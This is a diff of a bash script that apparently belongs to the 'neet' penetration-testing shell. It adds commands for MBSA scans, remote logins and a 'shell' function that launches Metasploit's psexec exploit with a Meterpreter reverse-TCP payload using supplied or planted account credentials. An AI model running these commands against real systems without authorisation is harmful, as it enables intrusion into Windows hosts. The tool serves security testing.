+		local PASS=`cat $CONFIG | grep ^Password.WindowsHelper= | awk -F= {print'$2'}`
+
+		echo "Running MBSA against $TARGET from $WINHELP. Results will be stored in $OUTFILE."
+		echo "*** This will return to the shell once it's complete. Please allow around 5 minutes. ***"
+
+		if [ ! -z USERPASS ] && echo $USERPASS | grep : >/dev/null; then
+			local TUSER=`echo $USERPASS | awk -F: {print'$1'}`
+			local TPASS=`echo $USERPASS | awk -F: {print'$2'}`
+			echo
+			memo Running MBSA against $TARGET as user $TUSER
+			echo winshell $WINHELP "$USER" "$PASS" "C:\\Program Files\\Microsoft Baseline Security Analyzer 2\\mbsacli.exe /nd /u $TUSER /p $TPASS /target $TARGET"
+
+			winshell $WINHELP "$USER" "$PASS" "C:\\Program Files\\Microsoft Baseline Security Analyzer 2\\mbsacli.exe /nd /u $TUSER /p $TPASS /target $TARGET" 2>&1 > $OUTFILE
+			# 2>&1 > $OUTFILE
+			# Construct a batch file and then run it. This seems to be the only way to actually get the authentication
+			# to work between the Windows Helper and the Target machines.
+			#winshell $WINHELP "$USER" "$PASS" "cmd.exe /c echo net use \\\\\\$TARGET\\IPC\$ $TPASS /user:$TUSER > C:\\mbsa-$TARGET.bat" >/dev/null 2>&1 
+			#winshell $WINHELP "$USER" "$PASS" "cmd.exe /c echo \\\"C:\\Program Files\\Microsoft Baseline Security Analyzer 2\\mbsacli.exe\\\" /nd /target $TARGET >> C:\\mbsa-$TARGET.bat" >/dev/null 2>&1
+			#winshell $WINHELP "$USER" "$PASS" "cmd.exe /c echo net use \\\\\\$TARGET\\IPC\$ /delete >> C:\\mbsa-$TARGET.bat" >/dev/null 2>&1
+			#winshell $WINHELP "$USER" "$PASS" "C:\\mbsa-$TARGET.bat" > $OUTFILE 2>&1
+			#winshell $WINHELP "$USER" "$PASS" "cmd.exe /c del C:\\mbsa-$TARGET.bat" >/dev/null 2>&1 
+			#echo winshell $WINHELP "$USER" "$PASS" "C:\\Program Files\\Microsoft Baseline Security Analyzer 2\\mbsacli.exe /u $TUSER /p $TPASS /nd /target $TARGET"
+			# 2>&1 > $OUTFILE
+
+			echo "Finished running MBSA against $TARGET."
+
+		else
+			echo
+			echo "Did you supply credentials in the correct format?"
+			#memo Running anonymous MBSA against $TARGET
+			#winshell $WINHELP "$USER" "$PASS" "C:\\Program Files\\Microsoft Baseline Security Analyzer 2\\mbsacli.exe /nd /target  $TARGET" 2>&1 > $OUTFILE
+		fi
+		echo
+	fi
+}
+
+function shell {
+	local od=$PWD
+	if [ -z $IP ]; then
+		echo "Switch to host mode to run shell."
+	elif grep "^OSFamily Windows" hostInfo.txt >/dev/null 2>&1; then
+		if grep "^AddedAccount " hostInfo.txt >/dev/null 2>&1; then
+			if [ -z $2 ]; then
+				local user=`grep "^NewUser=" $CONFIG | awk -F= {print'$2'}`
+				local pass=`grep "^NewPassword=" $CONFIG | awk -F= {print'$2'}`
+				$MSF/app/msfcli exploit/windows/smb/psexec RHOST=$IP LHOST=$LOCAL LPORT=$LOCALPORT TARGET=0 \
+				PAYLOAD=windows/meterpreter/reverse_tcp SMBUser="$user" SMBPass="$pass" E
+				cd $od
+			else
+				$MSF/app/msfcli exploit/windows/smb/psexec RHOST=$IP LHOST=$LOCAL LPORT=$LOCALPORT TARGET=0 \
+				PAYLOAD=windows/meterpreter/reverse_tcp SMBUser="$1" SMBPass="$2" E
+				cd $od
+			fi
+		elif [ -z $2 ]; then
+			echo "Usage: shell <username> <password>"
+		else
+			_USER="$1"
+			_PASS="$2"
+			_qlog "Launching psexec shell on $IP U:\"$_USER\" P:\"$_PASS\""
+			unset _DOMAIN
+
+			if echo "$_USER" | grep '\\' >/dev/null; then
+				_DOMAIN=`echo "$_USER" | awk -F'\\' {print'$1'}`
+				_USER=`echo "$_USER" | awk -F'\\' {print'$2'}`
+			fi
+	
+			# Ditched the windows/shell/reverse_tcp payload in favour of
+			# windows/meterpreter/reverse_tcp
+
+			if [ -z $_DOMAIN ]; then
+				#echo "Launching psexec shell on $IP U:\"$_USER\" P:\"$_PASS\""
+				$MSF/app/msfcli exploit/windows/smb/psexec RHOST=$IP LHOST=$LOCAL LPORT=$LOCALPORT TARGET=0 \
+				PAYLOAD=windows/meterpreter/reverse_tcp SMBUser="$_USER" SMBPass="$_PASS" E
+			else
+				#echo "Launching psexec shell on $IP D:\"$_DOMAIN\" U:\"$_USER\" P:\"$_PASS\""
+				$MSF/app/msfcli exploit/windows/smb/psexec RHOST=$IP LHOST=$LOCAL LPORT=$LOCALPORT TARGET=0 \
+				PAYLOAD=windows/meterpreter/reverse_tcp SMBDomain="$_DOMAIN" SMBUser="$_USER" SMBPass="$_PASS" E
+			fi
+
+			cd $od
+		fi
+	else
+		echo "Shell is implemented only for Windows hosts."
+	fi
+}
+
+function ___shell {
+	# Old version using winshell
+	if [ -z $IP ]; then
+		echo "Switch to host mode to run shell."
+	elif grep "^OSFamily Windows" hostInfo.txt >/dev/null 2>&1; then
+		if grep "^AddedAccount " hostInfo.txt >/dev/null 2>&1; then
+			if [ -z $2 ]; then
+				local user=`grep "^NewUser=" $CONFIG | awk -F= {print'$2'}`
+				local pass=`grep "^NewPassword=" $CONFIG | awk -F= {print'$2'}`
+				winshell $IP "$user" "$pass"
+			else
+				winshell $IP "$1" "$2"
+			fi
+		elif [ -z $2 ]; then
+			echo "Usage: shell <username> <password>"
+		else
+			winshell $IP "$1" "$2"
+		fi
+	else
+		echo "Shell is implemented only for Windows hosts."
+	fi
+}
+
+function cancel {
+	# Cancels all host scans
+	if [ ! -z $IP ]; then
+		echo "Are you sure you want to cancel all scans of this host ($IP) [y/N]?"
+		read -sn 1 r
+		if [ ! -z $r ] && [ "$r" == "y" ]; then
+			if [ ! -f "${NeetTLD}/${IP}/.cancelled" ]; then
+				touch "${NeetTLD}/${IP}/.cancelled"
+				echo "Cancelled all scans for $IP"
+			else
+				echo "All scans for $IP already cancelled."
+			fi
+		else
+			echo "Not cancelled"
+		fi
+	else
+		echo "Switch to host mode to use this command"
+	fi
+}
+
+function ip {
+	# Opposite of name
+	local host="$1"
+	if [ ! -z $host ]; then
+		grep -i " $host$" "${NeetTLD}/hostnames.txt" 2>/dev/null | awk {print'$1'}
+	fi
+}
+
+function name {
+	# Gets the hostname of a host if available
+	local host="$1"
+	if [ ! -z $host ]; then
+		host=`_matchIP $host`
+		grep "^$host " "${NeetTLD}/hostnames.txt" 2>/dev/null | awk {print'$2'}
+	else
+		egrep "^$IP\W"  "${NeetTLD}/hostnames.txt" 2>/dev/null | awk {print'$2'}
+	fi
+}
+
+function nbnames {
+	# Lists the NetBIOS names
+	[ -f "${NeetTLD}/hostnames.txt" ] && _lh "${NeetTLD}/hostnames.txt" plusextrainfo
+}
+
+function dnsnames {
+	# Lists the NetBIOS names
+	[ -f "${NeetTLD}/DNS.txt" ] && _lh "${NeetTLD}/DNS.txt" plusextrainfo
+}
+
+function vnc {
+	local host="$1"
+	if [ ! -z $host ]; then
+		host=`_matchIP $host`
+	elif [ ! -z $IP ]; then
+		host=$IP
+	fi
+	if grep "^${host}:" ${NeetTLD}/services/vnc.txt >/dev/null 2>&1; then
+		local vncport=`grep "^${host}:" ${NeetTLD}/services/vnc.txt | head -n1 | awk -F: {print'$2'} | awk -F/ {print'$2'}`
+		vncport=`expr $vncport - 5900`
+		vncviewer ${host}:$vncport &
+	else
+			echo -e "${RED}VNC Service not found on $host"
+	fi
+}
+
+function ts {
+	local host="$1"
+	if [ ! -z $host ]; then
+		host=`_matchIP $host`
+	elif [ ! -z $IP ]; then
+		host=$IP
+	fi
+	if grep "^${host}:" ${NeetTLD}/services/terminalservices.txt >/dev/null 2>&1; then
+		rdesktop $host &
+	else
+			echo -e "${RED}Terminal Services not found on $host"
+	fi
+}
+
+function sh {
+	if [ ! -z $IP ]; then
+		host=$IP
+		if grep "^${host}:" ${NeetTLD}/services/ssh.txt >/dev/null 2>&1; then
+			local sshport=`grep "^${host}:" ${NeetTLD}/services/ssh.txt | head -n1 | awk {print'$1'} | awk -F: {print'$2'} | awk -F/ {print'$2'}`
+			if [ -f "${NeetTLD}/$IP/.sshuser" ]; then
+				user=`cat "${NeetTLD}/$IP/.sshuser"`
+				echo ">>> LOGGING IN AS \"$user\". Remove the file $IP/.sshuser to change this."
+			else
+				echo "Enter the remote user name:"
+				read user
+			fi
+			ssh $host -p $sshport -l $user $@
+			ERR=$?
+			if [ $ERR -eq 0 ]; then
+				echo "$user" > "${NeetTLD}/$IP/.sshuser"
+			fi
+		else
+			echo -e "${RED}SSH Service not found on $host"
+		fi
+	else
+		host=`_matchIP $1`
+		if grep "^${host}:" ${NeetTLD}/services/ssh.txt >/dev/null 2>&1; then
+			local sshport=`grep "^${host}:" ${NeetTLD}/services/ssh.txt | head -n1 | awk {print'$1'} | awk -F: {print'$2'} | awk -F/ {print'$2'}`
+			ssh $host -p $sshport $2 $3 $4 $5 $6 $7 $8 $9
+		else
+			echo -e "${RED}SSH Service not found on $host"
+		fi
+	fi
+}
+
+function tnet {
+	local PORT
+	if [ ! -z $1 ]; then
+		PORT=$1
+	fi
+	if [ ! -z $IP ]; then
+		host=$IP
+		if [ -z $PORT ]; then
+			if grep "^${host}:" ${NeetTLD}/services/telnet.txt >/dev/null 2>&1; then
+				local port=`grep "^${host}:" ${NeetTLD}/services/telnet.txt | head -n1 | awk {print'$1'} | awk -F: {print'$2'} | awk -F/ {print'$2'}`
+				telnet ${host} ${port}
+			else
+				echo -e "${RED}Telnet Service not found on $host"
+			fi
+		else
+				telnet ${host} ${PORT}
+		fi
+	else
+		host=`_matchIP $1`
+		if grep "^${host}:" ${NeetTLD}/services/telnet.txt >/dev/null 2>&1; then
+			local port=`grep "^${host}:" ${NeetTLD}/services/telnet.txt | head -n1 | awk {print'$1'} | awk -F: {print'$2'} | awk -F/ {print'$2'}`
+			telnet ${host} ${port}
+		else
+			echo -e "${RED}Telnet Service not found on $host"
+		fi
+	fi
+}
+
+function memo {
+	if [ -z $1 ]; then
+		grep "\[MEMO\]" "${NeetTLD}/${NeetLOG}"
+	else
+		# Add memo item
+		${BD}/memo "${NeetTLD}/${NeetLOG}" $@
+	fi
+}
+
+function webs {
+	local URLS
+	for svc in `svc http | awk {print'$1'} | sed -e 's?[tcp/|udp/]??g'`; do URLS="$URLS http://$svc"; done
+	for svc in `svc https | awk {print'$1'} | sed -e 's?[tcp/|udp/]??g'`; do URLS="$URLS https://$svc"; done
+	${BROWSER} $URLS >/dev/null 2>&1
+}
+
+function web {
+	local PORT
+	if [ ! -z $1 ]; then
+		PORT=$1
+	fi
+	if [ ! -z $IP ]; then
+		host=$IP
+		if [ -z $PORT ]; then
+			if grep "^${host}:" ${NeetTLD}/services/http.txt >/dev/null 2>&1; then
+				local port=`grep "^${host}:" ${NeetTLD}/services/http.txt | head -n1 | awk {print'$1'} | awk -F: {print'$2'} | awk -F/ {print'$2'}`
+				${BROWSER} http://${host}:${port}/ >/dev/null 2>&1 &
+			else
+				echo -e "${RED}HTTP Service not found on $host"
+			fi
+		else
+				${BROWSER} http://${host}:${PORT}/ >/dev/null 2>&1 &
+		fi
+	else
+		host=`_matchIP $1`
+		if grep "^${host}:" ${NeetTLD}/services/http.txt >/dev/null 2>&1; then
+			local port=`grep "^${host}:" ${NeetTLD}/services/http.txt | head -n1 | awk {print'$1'} | awk -F: {print'$2'} | awk -F/ {print'$2'}`
+			${BROWSER} http://${host}:${port}/ >/dev/null 2>&1
+		else
+			echo -e "${RED}HTTP Service not found on $host" &
+		fi
+	fi
+}
+
+# **** General Commands ****
+#   **********************
+
+function cli {
+	if [ -f "${NeetCTL}/global.nt" ]; then
+		grep ^commandline "${NeetCTL}/global.nt" | sed -e s/commandline/neet/
+	else
+		_log "Command line not available"
+	fi
+}
+
+function logoff {
+	LOGGING=0
+	_log "Logging disabled"
+
+}
+
+function logon {
+	LOGGING=1
+	_log "Logging to $LOGFILE enabled"
+}
+
+function logfile {
+	if [ ! -z "$1" ]; then
+		_log "Logfile changed to $LOGFILE"
+		LOGFILE="$1"
+	else
+		echo "Logfile is $LOGFILE"
+	fi
+}
+
+function log {
+	local neetlog=`grep "^LogFile=" /opt/neet/etc/neet.conf | awk -F= {print'$2'}`
+	if [ -z "$1" ]; then
+		[ -f "$NeetTLD/logs/$neetlog" ] && cat "$NeetTLD/logs/$neetlog"
+	fi
+}
+
+function quit {
+	_log "neet shell exited"
+	exit >/dev/null 2>&1
+}
+
+function neetsh {
+	echo -e "${RED}You are already *IN* neetshell!"
+}
+
+# **** Shortcut Commands ****
+#   **********************
+
+function refresh {
+	# Creates shell aliases based on last unique part of of hostnames
+	# Runs every prompt when scan is running
+	# Don't do it more than once if the scan isn't running
+	local RUNNING=true
+	local DOIT=true
+	if ! grep "status run" "${NeetTLD}/.neet/global.nt" >/dev/null 2>&1; then
+		RUNNING=false	
+	fi
+
+	if $RUNNING; then
+		# Make sure we do the refresh every time
+		unset noMoreRefresh
+	fi
+	if [ -z $noMoreRefresh ]; then
+		neetshSetAliases=false
+		if [ -f "${NeetTLD}/liveHosts.txt" ]; then
+			# Clean out existing host aliases
+			for a in `alias | grep _host | awk {print'$2'} | awk -F= {print'$1'}`; do
+				unalias "$a" >/dev/null 2>&1
+			done
+			for h in `${BD}/aliases.pl ${NeetTLD}/liveHosts.txt`; do
+				pt_alias=`echo $h | awk -F~ {print'$1'}`
+				pt_host=`echo $h | awk -F~ {print'$2'}`
+				neetshSetAliases=true
+				alias "$pt_alias"="_host $pt_host"
+			done
+		fi
+
+		if [ -d "${NeetTLD}/.neet/down/" ]; then
+			# Prune the directories of dead hosts
+			cd "${NeetTLD}/.neet/down/"
+			for host in *.*.*.*; do
+				if [ -d "${NeetTLD}/${host}/raw" ]; then
+					rm -rf "${NeetTLD}/$host"
+				fi
+			done
+			cd - >/dev/null
+		fi
+
+		if ! $RUNNING; then
+			# We've just refreshed and we're not running. Save some time and don't refresh
+			# after this
+			noMoreRefresh=true
+		fi
+
+		if ! $neetshSetAliases && $refreshStartup; then
+			echo "No host aliases were generated. This is probably because there were too many"
+			echo "IP addresses from different ranges to construct a useful set of aliases."
+			echo "To switch to host mode, change into each host's directory and type \"hostmode\"."
+			echo
+			refreshStartup=false
+		fi
+	fi
+}
+
+# **** Disabled General Shell Commands ****
+#   *************************************
+
+
+# **** Internal Functions ****
+#   ************************
+
+function _matchIP {
+	local ip="$1"
+	if [ -f "${NeetTLD}/liveHosts.txt" ]; then
+		if ! grep "^$ip$" "${NeetTLD}/liveHosts.txt" >/dev/null 2>&1; then
+			if [ `grep "\.${ip}$" "${NeetTLD}/liveHosts.txt" | wc -l` == 1 ]; then
+				grep "\.${ip}$" "${NeetTLD}/liveHosts.txt"
+			fi
+		else
+			grep "^$ip$" "${NeetTLD}/liveHosts.txt" 2>/dev/null
+		fi
+	fi
+}
+
+function _scanrunning {
+	# Determines if the scan is running or not
+	if grep "^status running" "${NeetTLD}/.control/global.neet" >/dev/null 2>&1; then
+		return 0
+	fi
+	return 1
+}
+
+function _host {
+	if [ ! -z "$1" ]; then
+		local host="$1"	
+		if [ -d "${NeetTLD}/${host}" ]; then
+			_log "Current Host: $host"
+			cd "${NeetTLD}/${host}"
+			OLDHOST="$IP"
+			export IP="$host"
+			export HOST="$host"
+			export HostDir="${NeetTLD}/${host}"
+			local OS=`_osfam "$host"`
+			if _compromised "$host"; then
+				PS1="${_alss}${PCOLCOMP}[${IP}][Comp]"
+			elif _vuln "$host"; then
+				PS1="${_alss}${PCOLVULN}[${IP}][Vuln]"
+			elif _issues "$host"; then
+				PS1="${_alss}${PCOLISSUES}[${IP}][Issue]"
+			else
+				PS1="${_alss}${PCOLOK}[${IP}][OK]"
+			fi
+			if [ -f hostInfo.txt ]; then
+				# Added to aid manual exploitation with msf2 / MSF
+				export interface=`grep ^ReachedBy hostInfo.txt 2>/dev/null | awk {print'$2'}`
+				export LOCAL=`ifconfig $interface 2>/dev/null | grep "inet addr" | awk {print'$2'} | awk -F: {print'$2'}`
+				export LHOST=$LOCAL
+				export BIN=$BD
+				# Generate a random connect port number in the range 2000-65535
+				LOCALPORT=0
+				while [ "$LOCALPORT" -le 2000 ]; do
+  					LOCALPORT=$RANDOM
+					let "LOCALPORT %= 63535"
+				done
+				export LOCALPORT
+			fi
+			if [ ! -z "$OS" ]; then
+				PS1="${PS1}[${OS}]${NONE}[\W]> "
+			else
+				PS1="${PS1}${NONE}[\W]> "
+			fi
+		else
+			_log "Host $host not available"
+		fi
+	else
+		_log "Current host: $IP"
+	fi
+}
+
+function _lh {
+	# cats specified host lists with colourised output
+	local file="$1"
+	local ext="$2"
+	
+	if [ -f "$file" ]; then
+		for host in `cat "$file" | awk {print'$1'}`; do
+			if [ ! -z $ext ]; then
+				local hstat1=`grep "^$host " "$file" | awk {print'$2'} 2>/dev/null`
+				local hstat2=`grep "^$host " "$file" | awk {print'$3'} 2>/dev/null`
+				local hstat3=`grep "^$host " "$file" | awk {print'$4'} 2>/dev/null`
+			fi
+			if _compromised $host; then
+				host=`echo "$host " | $TRANSLATOR`
+				echo -e "${COLCOMP}$host $hstat1 $hstat2 $hstat3"
+			elif _vuln $host; then
+				host=`echo "$host " | $TRANSLATOR`
+				echo -e "${COLVULN}$host $hstat1 $hstat2 $hstat3"
+			elif _issues $host; then
+				host=`echo "$host " | $TRANSLATOR`
+				echo -e "${COLISSUES}$host $hstat1 $hstat2 $hstat3"
+			else
+				host=`echo "$host " | $TRANSLATOR`
+				echo -e "${COLOK}$host $hstat1 $hstat2 $hstat3"
+			fi
+		done
+	fi
+}
+
+function _compromised {
+	# Determines if a host has been compromised
+	local host="$1"
+	if [ -f "${NeetTLD}/${host}/.comp" ]; then
+		return 0
+	fi
+	return 1
+}
+
+function __listcomp {
+	for host in `cat ${NeetTLD}/compromised.txt  2>/dev/null | awk {print'$1'}`; do
+		echo $host
+	done
+}
+
+function _vuln {
+	# Determines if a host has vulnerabilities
+	local host="$1"
+	if [ -f "${NeetTLD}/${host}/.vuln" ]; then
+		return 0
+	fi
+	return 1
+}
+
+function _issues {
+	# Determines if a host has issues
+	local host="$1"
+	if [ -f "${NeetTLD}/${host}/.issue" ]; then
+		return 0
+	fi
+	return 1
+}
+
+function _os {
+	local T=$1
+	if [ ! -z $T ]; then
+		if [ -f "${NeetTLD}/${T}/hostInfo.txt" ]; then
+			grep "^OS " "${NeetTLD}/${T}/hostInfo.txt" | sed -e 's/^OS //';
+		elif [ -f hostInfo.txt ]; then
+			grep "^OS " hostInfo.txt | sed -e 's/^OS //';
+		fi
+	fi
+}
+
+function _osfam {
+	# Gets the operating system family of a host if available
+	local host=$1
+	local os
+	if grep "^$host " "${NeetTLD}/windows.txt" >/dev/null 2>&1; then
+		os=`grep "^$host " "${NeetTLD}/windows.txt" 2>/dev/null | awk {print'$2'}`
+	elif grep "^$host " "${NeetTLD}/unix.txt" >/dev/null 2>&1; then
+		os=`grep "^$host " "${NeetTLD}/unix.txt" 2>/dev/null | awk {print'$2'}`
+	fi
+	if [ "$os" == "Windows" ]; then
+		os="Win"
+	fi
+	echo "$os"
+}
+
+function _numservices {
+	cat ${NeetTLD}/services/* 2>/dev/null | wc -l
+}
+
+function _numhosts {
+	cat ${NeetTLD}/liveHosts.txt 2>/dev/null | wc -l
+}
+
+function _numwin {
+	cat ${NeetTLD}/windows.txt 2>/dev/null | wc -l
+}
+
+function _numnix {
+	cat ${NeetTLD}/unix.txt 2>/dev/null | wc -l
+}
+
+function _numnoid {
+	local h=`_numhosts`
+	local w=`_numwin`
+	local u=`_numnix`
+	expr $h - $w - $u
+}
+
+# *** OK. We're good to go
+echo -e "${COLCOMP}THIS COLOUR${NONE} denotes hosts that have been ${COLCOMP}COMPROMISED${NONE} by neet."
+echo -e "${COLVULN}THIS COLOUR${NONE} denotes hosts that are ${COLVULN}VULNERABLE${NONE}, but have not yet been compromised."
+echo -e "${COLISSUES}THIS COLOUR${NONE} denotes hosts that may not be directly vulnerable, but have ${COLISSUES}ISSUES${NONE}."
+echo -e "${COLOK}THIS COLOUR${NONE} denotes hosts that are ${COLOK}OK${NONE} (no issues or vulnerabilities at the moment)."
+echo
+
+_log "neet shell $VERSION started in $NeetTLD"
+echo "Type \"help\" for neet shell help."
+echo
+
+# See if there are any customisations to be imported
+if [ -d "${BaseD}/custom" ]; then
+	for dir in `find "${BaseD}/custom" -maxdepth 1 -type d`; do
+		if [ -f "${dir}/neetshellext" ]; then
+			. "${dir}/neetshellext"
+			echo
+		fi
+	done
+fi
+
+# Update host list
+refreshStartup=false
+refresh
+
